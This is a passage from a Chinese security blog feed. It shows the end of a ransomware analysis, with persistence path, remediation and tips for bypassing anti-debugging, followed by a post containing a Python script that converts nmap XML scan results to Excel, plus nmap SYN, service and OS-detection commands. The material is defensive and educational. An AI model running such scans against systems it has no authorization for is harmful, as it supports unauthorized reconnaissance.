Menu\Programs\Startup\7407.tmp.exe<br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\7407.tmp.exe</p></li><li><p>病毒不会蠕虫传播、无明显的网络行为</p></li><li><p>没有加密操作，只是自定义了一些函数，对文件内容读取、运算，写入新文件，删除源文件</p></li><li><p>目前测试火绒杀毒不能识别病毒文件</p></li></ol><p> 分析到这，通知用户在中毒机器上 杀掉所有 7407.tmp.exe进程，删除对应注册表、自身复制的文件，使用磁盘恢复工具尝试一下能不能恢复文件。</p><h3 id="0x07-分析过程中的一些小知识点"><a href="#0x07-分析过程中的一些小知识点" class="headerlink" title="0x07 分析过程中的一些小知识点"></a>0x07 分析过程中的一些小知识点</h3><ol><li>调试时发现反调插件已经有了，还是一调试就退出，先尝试把异常忽略关闭，看看是否可行；同时考虑程序检测导入函数是否被下断点（原因是OD在设置CC断点时，会将对应位置的机器码修改为 CC01，反调试程序会检测这个位置），这时可以尝试在CALL内第二行设置断点</li><li>对于自身启动新进程，通过内存将真实文件内容写入的方式，可以通过火绒剑一步一步监控，再找对应的API函数，下断点调试</li><li>OD中找到一个函数，想要在IDA中找到对应位置，因为IDA有伪代码，一般情况，直接跳转地址，发现找不到，此时，使用 函数地址 - OD中基址 + IDA基址 ，再使用G跳转，也可以找到特征字符，在IDA中使用 alt + b搜索位置</li></ol>]]></content>
    
    
    <summary type="html">PE程序逆向初探</summary>
    
    
    
    <category term="勒索病毒" scheme="http://blog.ninefiger.top/categories/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
    
    
    <category term="病毒分析" scheme="http://blog.ninefiger.top/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="逆向学习" scheme="http://blog.ninefiger.top/tags/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Nmap结果过滤脚本</title>
    <link href="http://blog.ninefiger.top/2018/05/13/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/"/>
    <id>http://blog.ninefiger.top/2018/05/13/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/</id>
    <published>2018-05-13T09:12:29.000Z</published>
    <updated>2021-08-28T01:38:44.544Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一个简单的python脚本，将nmap输出的xml格式提取为excel</p></blockquote><h3 id="一、Nmap扫描"><a href="#一、Nmap扫描" class="headerlink" title="一、Nmap扫描"></a>一、Nmap扫描</h3><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/1.png" alt="精准打击"></p><p>  在信息收集阶段，一个重要的环节就是端口扫描，如果是一两个目标直接干就完了；但是如果是一堆IP地址段怎么办，这时扫描结果呼啦一大片，随便挑几个深入，这样显得不够专业吧</p><hr><p><strong>nmap的几个命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. nmap -sS 192.168.1.1 -T4 --open -n</span><br><span class="line">2. nmap -sV 192.168.1.1 -T4 --open -p 22,80,3389 -n -O</span><br></pre></td></tr></table></figure><blockquote><p>注明：nmap的参数有很多，不列举了，sS 使用SYN的快速扫描（速度快），sV 探测端口服务，-O 探测目标操作系统</p></blockquote><h3 id="二、结果输出"><a href="#二、结果输出" class="headerlink" title="二、结果输出"></a>二、结果输出</h3><p>  添加-oX参数指定输出为xml格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. nmap -sS 192.168.1.1 -T4 --open -n -oX test.xml</span><br></pre></td></tr></table></figure><h3 id="三、xml结果过滤"><a href="#三、xml结果过滤" class="headerlink" title="三、xml结果过滤"></a>三、xml结果过滤</h3><h5 id="1-关于xml文件解析"><a href="#1-关于xml文件解析" class="headerlink" title="1. 关于xml文件解析"></a>1. 关于xml文件解析</h5><p>  python中解析xml有四种方法，其实对于我们这些偶尔拿来吃鸡的来说，随便一个就行了<br>常用的xml.dom.minidom和xml.etree.ElementTree，其中xml.etree.ElementTree有一个C语言的实现，即xml.etree.cElementTree，听说速度会快一点。（python3.3+版本后，ElemenTree模块会自动优先使用C加速器，如果不存在C实现，则会使用Python实现）</p><h5 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2. 代码实现"></a>2. 代码实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET   <span class="comment">#解析xml，python3已经默认使用cElementTree</span></span><br><span class="line"><span class="keyword">import</span> xlwt     <span class="comment">#写excel</span></span><br><span class="line"><span class="keyword">import</span> argparse    <span class="comment">#运行前参数</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断运行时python版本是否小于3.x</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info.major &lt; <span class="number">3</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I need python3.x&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parsexml</span>(<span class="params">xml,sheet</span>):</span></span><br><span class="line">tree = ET.parse(xml)</span><br><span class="line">root = tree.getroot()     <span class="comment">#获取根节点</span></span><br><span class="line">hosts = root.findall(<span class="string">&quot;host&quot;</span>)</span><br><span class="line">i = <span class="number">0</span>   <span class="comment">#写入excel的计数器</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line">portTcpRes = <span class="string">&quot;&quot;</span></span><br><span class="line">portOtherRes = <span class="string">&quot;&quot;</span></span><br><span class="line">ip = host.find(<span class="string">&quot;address&quot;</span>)</span><br><span class="line">ipaddress = ip.attrib.get(<span class="string">&#x27;addr&#x27;</span>)</span><br><span class="line"><span class="comment"># print(&quot;ip地址:&quot;+ ipaddress)</span></span><br><span class="line">ports = host.find(<span class="string">&quot;ports&quot;</span>).findall(<span class="string">&quot;port&quot;</span>)</span><br><span class="line"><span class="comment">#获取系统版本的扫描结果</span></span><br><span class="line">os = host.find(<span class="string">&quot;os&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">osmatch = os.find(<span class="string">&quot;osmatch&quot;</span>)</span><br><span class="line">osname = osmatch.attrib.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">accuracy = osmatch.attrib.get(<span class="string">&quot;accuracy&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">osname = <span class="string">&quot;&quot;</span></span><br><span class="line">accuracy = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># print(ports)</span></span><br><span class="line"><span class="keyword">for</span> portT <span class="keyword">in</span> <span class="built_in">list</span>(ports):</span><br><span class="line">service = portT.find(<span class="string">&quot;service&quot;</span>)</span><br><span class="line">protocol = portT.attrib.get(<span class="string">&#x27;protocol&#x27;</span>)</span><br><span class="line"><span class="comment">#获取nmap结果中service信息</span></span><br><span class="line">serviceName = service.attrib.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">product = service.attrib.get(<span class="string">&#x27;product&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> product:</span><br><span class="line">serviceName = serviceName + <span class="string">&#x27;:&#x27;</span> + product   <span class="comment">#将SERVICE和VERSION组合一起</span></span><br><span class="line"><span class="comment">#获取端口号</span></span><br><span class="line">portNum = portT.attrib.get(<span class="string">&#x27;portid&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> protocol == <span class="string">&#x27;tcp&#x27;</span>:</span><br><span class="line">portTcpRes += portNum + <span class="string">&#x27;(&#x27;</span> + serviceName + <span class="string">&#x27;),&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:<span class="comment">#其他协议</span></span><br><span class="line">portOtherRes += portNum + <span class="string">&#x27;(&#x27;</span> + serviceName + <span class="string">&#x27;),&#x27;</span></span><br><span class="line">output(sheet,ipaddress,portTcpRes.strip(<span class="string">&#x27;,&#x27;</span>),portOtherRes.strip(<span class="string">&#x27;,&#x27;</span>),i,osname,accuracy+<span class="string">&quot;%&quot;</span>)    <span class="comment">#写入excel</span></span><br><span class="line"><span class="comment"># print(portTcpRes.strip(&#x27;,&#x27;))</span></span><br><span class="line"><span class="comment"># print(&#x27;------------------------&#x27;)</span></span><br><span class="line"><span class="comment">#初始化excel</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">excelcsh</span>():</span></span><br><span class="line">ExcelFile = xlwt.Workbook(encoding=<span class="string">&#x27;utf-8&#x27;</span>,style_compression=<span class="number">0</span>)</span><br><span class="line">sheet1 = ExcelFile.add_sheet(<span class="string">&#x27;nmap结果&#x27;</span>)</span><br><span class="line"><span class="comment">#表格第一行</span></span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;ip地址&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;TCP端口&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;其他协议端口&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;系统版本&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;系统扫描精准度&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> ExcelFile,sheet1</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">sheet,ip,tcpport,otherproto,num,osversion,accuracy</span>):</span></span><br><span class="line"><span class="comment">#写入数据</span></span><br><span class="line">sheet.write(num,<span class="number">0</span>,ip)</span><br><span class="line">sheet.write(num,<span class="number">1</span>,tcpport)</span><br><span class="line">sheet.write(num,<span class="number">2</span>,otherproto)</span><br><span class="line">sheet.write(num,<span class="number">3</span>,osversion)</span><br><span class="line">sheet.write(num,<span class="number">4</span>,accuracy)</span><br><span class="line"><span class="comment">#刷新缓存</span></span><br><span class="line">sheet.flush_row_data()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;xml解析&quot;</span>)<span class="comment">#.decode(&#x27;utf-8&#x27;).encode(&#x27;gbk&#x27;)</span></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-x&#x27;</span>,action=<span class="string">&quot;store&quot;</span>,required=<span class="literal">False</span>,dest=<span class="string">&quot;xml&quot;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,<span class="built_in">help</span>=<span class="string">&#x27;nmap result(xml file)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>,action=<span class="string">&quot;store&quot;</span>,required=<span class="literal">False</span>,dest=<span class="string">&quot;outfile&quot;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,<span class="built_in">help</span>=<span class="string">&#x27;outputName&#x27;</span>,default=<span class="string">&quot;excel.xls&quot;</span>)</span><br><span class="line"><span class="comment"># parser.add_argument(&#x27;--file&#x27;,action=&quot;store&quot;,required=False,dest=&quot;file&quot;,type=str,help=&#x27;Input filename eg:a.txt&#x27;)</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">xml = args.xml</span><br><span class="line">outpath = args.outfile</span><br><span class="line"><span class="keyword">if</span> xml:</span><br><span class="line">excelfile,sheet = excelcsh()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">parsexml(xml,sheet)</span><br><span class="line"><span class="keyword">except</span> FileExistsError <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;xml文件不存在&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">excelfile.save(outpath)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;文件保存至 %s&quot;</span> % outpath)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Error args&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;eg: python3 pythonXml.py -x nmap.xml -o nmap.xls&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="3-怎么用"><a href="#3-怎么用" class="headerlink" title="3. 怎么用"></a>3. 怎么用</h5><p>因为每个人的习惯都不同，写的鬼东西自己感觉方便，别人看来可能都运行不起来，所以简单说明一下<br>a. 需要安装xlwt库，命令行中运行: pip install xlwt<br>b. 需要用python3.x运行，python2的兄弟可以把 print() 改成 print ，同时把开头效验版本的if语句注释掉<br>c. python3 nmapxml2excel -x test.xml -o test.xls</p><h3 id="四、补充"><a href="#四、补充" class="headerlink" title="四、补充"></a>四、补充</h3><ol><li><p>nmap扫描端口和服务</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/2.png" alt="2"></p></li><li><p>脚本过滤</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/3.png" alt="3"></p></li><li><p>excel内容</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/4.png" alt="4"></p></li><li><p>批量结果处理</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/5.png" alt="5"></p></li></ol>]]></content>
    
    
    <summary type="html">半自动化？</summary>
    
    
    
    <category term="脚本" scheme="http://blog.ninefiger.top/categories/%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="py脚本" scheme="http://blog.ninefiger.top/tags/py%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
</feed>
